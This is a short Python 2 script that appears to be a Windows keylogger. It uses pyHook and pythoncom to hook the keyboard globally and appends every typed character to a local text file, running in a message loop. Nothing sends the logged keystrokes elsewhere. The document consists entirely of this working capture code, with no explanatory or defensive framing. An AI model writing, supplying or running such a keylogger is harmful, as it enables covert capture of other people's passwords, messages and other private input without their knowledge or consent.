import win32api 
import sys
import pythoncom, pyHook


buffer = ''
a = open('sucksex.txt','w')
a.close()

def OnKeyboardEvent(event):
	f = open ('sucksex.txt', 'a') 
	if event.Ascii != 13: 
		keylogs = chr(event.Ascii) 
	if event.Ascii == 13: 
		print event.Ascii
		keylogs = '\n' 
	f.write(keylogs) 
	f.close()

while True:
	hm = pyHook.HookManager() 
	hm.KeyDown = OnKeyboardEvent 
	hm.HookKeyboard() 
	pythoncom.PumpMessages()
